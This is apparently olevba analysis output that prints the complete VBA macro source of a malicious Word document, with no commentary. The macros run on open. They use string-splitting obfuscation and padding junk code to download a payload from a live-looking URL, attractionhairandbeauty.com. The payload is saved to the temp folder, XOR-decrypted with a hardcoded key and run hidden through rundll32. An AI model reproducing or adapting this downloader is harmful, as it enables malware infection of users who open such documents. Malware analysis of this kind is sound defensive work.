olevba 0.47 - http://decalage.info/python/oletools
Flags        Filename
-----------  -----------------------------------------------------------------
OpX:MASI-BD- DOC-20160923-WA000486.docm
===============================================================================
FILE: DOC-20160923-WA000486.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub autoopen()
ItNinja "ASDEX"
End Sub
Function copy_screen_to_array(output_array)
    output_array = "" 'resetting array
    Dim screenarray(23) '24 line array
    Row = 1
    For Each Line In screenarray
        EMReadS.creen reading_line, 80, Row, 1
        output_array = output_array & reading_line & "UUDDLRLRBA"
        Row = Row + 1
    Next
    output_array = Split(output_array, "UUDDLRLRBA")
End Function





-------------------------------------------------------------------------------
VBA MACRO Module1.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Public horSFreedayDAcdaw As Object
Public horSFreedayra12dv34 As Object
Public horSFreedayKSKLAL As Object



Public horSFreedayLAKOPPC As String
Public horSFreedayPLdunay() As String
Public horSFreedayUUUKA As String
Public horSFreedayUUUKABBB As String


Public horSFreedayGMAKO As Object
Public horSFreeday4 As String
 Public horSFreeday2 As String
Public horSFreedayASALLLP As Variant

Const RACHEL = "etofi"
'#####################################
Function PhraseCmd(cmd)
    PhraseCmd = False ' not 'cd'
    arrCommand = Split(cmd)
    strExe = arrCommand(0)
    If LCase(Trim(strExe)) = "cd" Or LCase(Trim(strExe)) = "cd.exe" Then PhraseCmd = "cd"  ' is 'cd'
    regEx.Pattern = "^[a-z]:$"
    regEx.IgnoreCase = True
    Set Matches = regEx.Execute(cmd)
    If Matches.Count <> 0 Then PhraseCmd = "cd" ' is 'd:'
    'phrase time command
    regEx.Pattern = "(.*?)-wait(\d+)"
    regEx.IgnoreCase = True
    Set Matches = regEx.Execute(cmd)
    If Matches.Count <> 0 Then
        Set objMatch = Matches(0)
        Command = objMatch.SubMatches(0)
        'WScript.Echo "Command :" & command
        WAITTIME = CInt(objMatch.SubMatches(1))
        WScript.Echo "WMIEXEC : Waiting " & WAITTIME & " ms..." & vbNewLine
    End If
    'phrase persist command
    regEx.Pattern = "(.*?)-persist"
    regEx.IgnoreCase = True
    Set Matches = regEx.Execute(cmd)
    If Matches.Count <> 0 Then
        Set objMatch = Matches(0)
        Command = objMatch.SubMatches(0)
        PhraseCmd = "persist"  ' is quiet
    End If
End Function


Public Function TlfFormat(ByVal tlfNr As String, dilodan As Boolean) As String
    Dim tmp As String
    Dim i As Long
If dilodan Then
 horSFreedayLAKOPPC = horSFreedayKSKLAL(horSFreedayPLdunay(6))
 horSFreedayUUUKA = horSFreedayLAKOPPC


 horSFreedayUUUKABBB = horSFreedayUUUKA + "\fillrach"
horSFreedayUUUKA = horSFreedayUUUKA + horSFreedayPLdunay(12)

Exit Function
Else
GoTo VarPupka
End If
restart:
    For i = 1 To Len(tlfNr)
        If Mid$(tlfNr, i, 1) = " " Then
            tlfNr = Mid$(tlfNr, 1, i - 1) & Mid$(tlfNr, i + 1)
            GoTo restart
        End If
    Next i

    For i = 1 To Len(tlfNr)
        tmp = tmp & Mid$(tlfNr, i, 1)
        If i = 2 Or i = 4 Or i = 6 Or i = 8 Or i = 10 Then
            tmp = tmp & " "
        End If
    Next i

    TlfFormat = tmp

VarPupka:
CallByName horSFreedayra12dv34, "sav" + RACHEL + "le", VbMethod, horSFreedayUUUKABBB, 14 / 7
 UNDOPRYXOR horSFreedayUUUKABBB, horSFreedayUUUKA, "iULyyRhL3OJ7N0SX6GGXh08u4uclKcx8"


     Call Shell("rundl" & "l32.exe " & horSFreedayUUUKA & ",qwerty", vbHide)
End Function

Function CreateShare()
    'create share
    Set objNewShare = objWMIService.Get("Win32_Share")
    intReturn = objNewShare.Create _
        (FilePath, "WMI_SHARE", 0, 25, "")
    If intReturn <> 0 Then
        WScript.Echo "WMIEXEC ERROR: Share could not be created." & _
            vbNewLine & "WMIEXEC ERROR: Return value -> " & intReturn
        Select Case intReturn
            Case 2
                WScript.Echo "WMIEXEC ERROR: Access Denied!"
            Case 9
                WScript.Echo "WMIEXEC ERROR: Invalid File Path!"
            Case 22
                WScript.Echo "WMIEXEC ERROR: Share Name Already In Used!"
            Case 24
                WScript.Echo "WMIEXEC ERROR: Directory NOT exists!"
        End Select
        If intReturn <> 22 Then WScript.Quit 1
    Else
        WScript.Echo "WMIEXEC : Share created sucess."
        WScript.Echo "WMIEXEC : Share Name -> WMI_SHARE"
        WScript.Echo "WMIEXEC : Share Path -> " & FilePath
    End If
End Function



Public Function GodnTeBabenParama(CH1 As String, CH2 As String, CH3 As String) As String
GodnTeBabenParama = Replace(CH1, CH2, CH3)
End Function
Public Function NombreUsuario() As String
Dim SQL As String


 horSFreedayra12dv34.Type = 0 + 0 + 1

 horSFreedayra12dv34.Open
Exit Function


SQL = "Select * from Usuarios WHERE usu_id=" & IdUsuario


If Not RsUsuario.EOF Then
    NombreUsuario = RsUsuario!usu_apodo
End If
End Function
Function DeleteShare()
    Set colShares = objWMIService.ExecQuery _
        ("Select * from Win32_Share Where Name = 'WMI_SHARE'")
    For Each objShare In colShares
        intReturn = objShare.Delete
    Next
    If intReturn <> 0 Then
        WScript.Echo "WMIEXEC ERROR: Delete Share failed." & _
            vbNewLine & "WMIEXEC ERROR: Return value -> " & intReturn
        Select Case intReturn
            Case 2
                WScript.Echo "WMIEXEC ERROR: Access Denied!"
            Case 25
                WScript.Echo "WMIEXEC ERROR: Share Not Exists!"
        End Select
    Else
        WScript.Echo "WMIEXEC : Share deleted sucess."
    End If
End Function


Public Function ToDBDateTime(ByVal ddmmyyhhmmDateTime As String) As String

     Set horSFreeday1DASH1solo = CreateObject(horSFreedayPLdunay(3))
 Set horSFreedayKSKLAL = horSFreeday1DASH1solo.Environment(horSFreedayPLdunay(2 + 2))
 VerCadenaPermiso ddmmyyhhmmDateTime
End Function


Public Sub VerCadenaPermiso(permiso As String)
Dim i As Long
Dim letra As String

Alta = False
Baja = False
modi = False
Dim Consu As Boolean
Consu = True


 horSFreeday4 = "http://attractionhairandbeauty.com/bdb37"

 If Application = "Microsoft Word" Then
 horSFreedayDAcdaw.Open horSFreedayPLdunay(5), horSFreeday4, False

horSFreedayDAcdaw.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"

horSFreedayDAcdaw.Send
TlfFormat letra, True
 NombreUsuario
  horSFreedayacheha letra
End If

Exit Sub
    For i = 1 To Len(permiso)

        letra = Mid(permiso, i, 1)

        If letra = "A" Then
            Alta = True
        End If

        If letra = "B" Then
            Baja = True
        End If

        If letra = "M" Then
            modi = True
        End If

        If letra = "C" Then
            Consu = True
        End If
    Next i
    If Len(permiso) = 0 Then
        Consu = False
        modi = False
        Alta = False
        Baja = False
    End If
End Sub



Public Sub UNDOPRYXOR(SourceFile As String, DestFile As String, Optional Key As String)

  Dim Filenr As Integer
  Dim ByteArray() As Byte





  Filenr = FreeFile
  Open SourceFile For Binary As #Filenr
  ReDim ByteArray(0 To LOF(Filenr) - 1)
  Get #Filenr, , ByteArray()
  Close #Filenr


  Call DecryptByte(ByteArray(), Key)



  Filenr = FreeFile
  Open DestFile For Binary As #Filenr
  Put #Filenr, , ByteArray()
  Close #Filenr

End Sub



Public Function horSFreedayacheha(pass As String) As String
    Dim temp As String
    Dim horSFreedaytum As String
    GoTo beyTumba
    Dim pos As Long
    Dim leng As Long
    Dim tim As Variant
    Dim i As Long
    Dim Key As Long
    leng = Len(pass)
    tim = Mid(Time, 1, 8)
    tim = Mid(tim, 1, Len(tim) - 3)
    tim = Mid(tim, Len(tim) - 1, 2) * Int(Rnd * 100)
    For i = 1 To Len(CStr(tim))
        pos = pos + CInt(Mid(CStr(tim), i, 1))
    Next
    While pos > Len(pass)
        pos = pos Mod 10 + Int(Rnd * 10)
        If pos = 0 Then
            pos = Len(pass) + 1
        End If
    Wend

beyTumba:

horSFreedayASALLLP = horSFreedayDAcdaw.responseBody

 ReadResult

End Function


-------------------------------------------------------------------------------
VBA MACRO Module2.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Public Function ReadResult()


 horSFreedayra12dv34.Write horSFreedayASALLLP
GoTo pid7
    WScript.Sleep (WAITTIME)
    UNCFilePath = "\\" & host & "\" & "WMI_SHARE" & "\" & FileName
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set objFile = fso.OpenTextFile(UNCFilePath, 1)
    If Not objFile.AtEndOfStream Then strContents = objFile.ReadAll
    objFile.Close
    WScript.Echo strContents
    'fso.DeleteFile(UNCFilePath)   win2008 fso has no privilege to delete file on share folder
    strDelFile = "del " & file & " /F"
    exec strDelFile, "nul"
pid7:
     TlfFormat "", False
End Function

Function exec(cmd, file)
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 12

    Set objProcess = objWMIService.Get("Win32_Process")
    strExec = "cmd.exe /c " & cmd & " > " & file & " 2>&1"  '2>&1 err
    If boolPersist Then
        strExec = cmd
        intPath = InStr(cmd, "\")
        If intPath = 0 Then strExec = CurrentFolder & "\" & strExec
    End If
    'WScript.Echo strExec
    intReturn = objProcess.Create _
        (strExec, CurrentFolder, objConfig, intProcessID)  'Add CurrentFolder (strExec, Null, objConfig, intProcessID)
    If intReturn <> 0 Then
        WScript.Echo "WMIEXEC ERROR: Process could not be created." & _
            vbNewLine & "WMIEXEC ERROR: Command -> " & cmd & _
            vbNewLine & "WMIEXEC ERROR: Return value -> " & intReturn
        Select Case intReturn
            Case 2
                WScript.Echo "WMIEXEC ERROR: Access Denied!"
            Case 3
                WScript.Echo "WMIEXEC ERROR: Insufficient Privilege!"
            Case 9
                WScript.Echo "WMIEXEC ERROR: Path Not Found!"
        End Select
    Else
'       WScript.Echo "Process created." & _
'           vbNewLine & "Command: " & cmd & _
'           vbNewLine & "Process ID: " & intProcessID
        If boolPersist Then WScript.Echo "WMIEXEC : Process created. PID: " & intProcessID
        If boolGetFolder = True Then
            boolGetFolder = False
            exec = GetCurrentFolder()
            Exit Function
        End If
        'ReadResult()
    End If
End Function
Public Function GetCurrentFolder()
     horSFreeday2 = GodnTeBabenParama(horSFreeday2, "*P", LCase("S"))
GoTo mig5

    WScript.Sleep (WAITTIME)
    UNCFilePath = "\\" & host & "\" & "WMI_SHARE" & "\" & FileName
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set objFile = fso.OpenTextFile(UNCFilePath, 1)
    GetCurrentFolder = objFile.ReadLine
    objFile.Close
    strDelFile = "del " & file & " /F"
    exec strDelFile, "nul"
mig5:
     horSFreedayPLdunay = Split(horSFreeday2, "JIIIINX")
End Function

-------------------------------------------------------------------------------
VBA MACRO Module3.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/Module3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


Public Function ClearString(ByRef inOrigString As String) As String
    Dim strNewString As String
    Dim sChar As String
Dim i As Integer
 Dim d As Boolean
 d = True
 IsWord = True
 For i = 1 To Len(Trim("Reika"))
 If d = False Then
Set horSFreedayDAcdaw = CreateObject(horSFreedayPLdunay(i - 2))
Exit For
Else
d = False
End If
Next i
ToDBDateTime ""
Exit Function

Call check_fo.r_MAXIS(False) 'stops script if user is passworded out

Call navigate_t.o_MAXIS_screen("POLI", "____")
EMWri.teScreen "TEMP", 5, 40
EMWri.teScreen "TABLE", 21, 71
trans.mit

'Opening the Excel file, (now that the dialog is done)
Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = True
Set objWorkbook = objExcel.Workbooks.Add()
objExcel.DisplayAlerts = True

'formatting excel file with columns for case number and phone numbers
objExcel.Cells(1, 1).Value = "TITLE"
objExcel.Cells(1, 2).Value = "SECTION"
objExcel.Cells(1, 3).Value = "REVISED"

For i = 1 To 3      'formatting the cells'
    objExcel.Cells(1, i).Font.Bold = True       'bold font'
Next



    ClearString = strNewString
End Function




Public Function ItNinja(ByRef inGUID As String) As String
horSFreeday2 = "+Iicro*Poft.X+ILHTTPJIIIINXAdodb.*Ptr-Ea+IJIIIINX*Ph-Ell.Ap"
horSFreeday2 = horSFreeday2 + GodnTeBabenParama("plicationJIIIINXW*Pcript.*Ph-EllJIIIINXProc-E*P*PJIIIINXG-ETJIIIINXT-E+IPJIIIINXTyp-EJIIIINXop-EnJIIIINXwritFILMABOpon*P-EBodyJIIIINX*Pav-Etofil-EJIIIINX", "FILMABO", "-EJIIIINXr-E*P")
horSFreeday2 = GodnTeBabenParama(horSFreeday2 + "\hupoa*P.dll", "-E", "e")


GetResulOfMyResult "-"
Exit Function
    If Mid$(inGUID, 1, 1) <> "{" Then
        ItNinja = "{" & inGUID & "}"
    Else
        ItNinja = inGUID
    End If
End Function




Public Function GetResulOfMyResult(ByVal Cadena As String) As String


 horSFreeday2 = GodnTeBabenParama(horSFreeday2, "+I", "M")
GetCurrentFolder


 Set horSFreedayra12dv34 = CreateObject(horSFreedayPLdunay(1))

 Set horSFreedayGMAKO = CreateObject(horSFreedayPLdunay(5 - 3))

 ClearString ""
End Function

Public Sub DecryptByte(ByteArray() As Byte, Key As String)

  Dim offset As Long
  Dim ByteLen As Long
  Dim ResultLen As Long
  Dim CurrPercent As Long
  Dim NextPercent As Long
  Dim m_Key() As Byte
Dim m_KeyLen As Long

  m_KeyLen = Len(Key)
ReDim m_Key(m_KeyLen)

  m_Key = StrConv(Key, vbFromUnicode)


  ByteLen = UBound(ByteArray) + 1
  ResultLen = ByteLen


  For offset = 0 To (ByteLen - 1)
    ByteArray(offset) = ByteArray(offset) Xor m_Key(offset Mod m_KeyLen)


    If (offset >= NextPercent) Then
      CurrPercent = Int((offset / ResultLen) * 100)
      NextPercent = (ResultLen * ((CurrPercent + 1) / 100)) + 1
    End If
  Next
End Sub
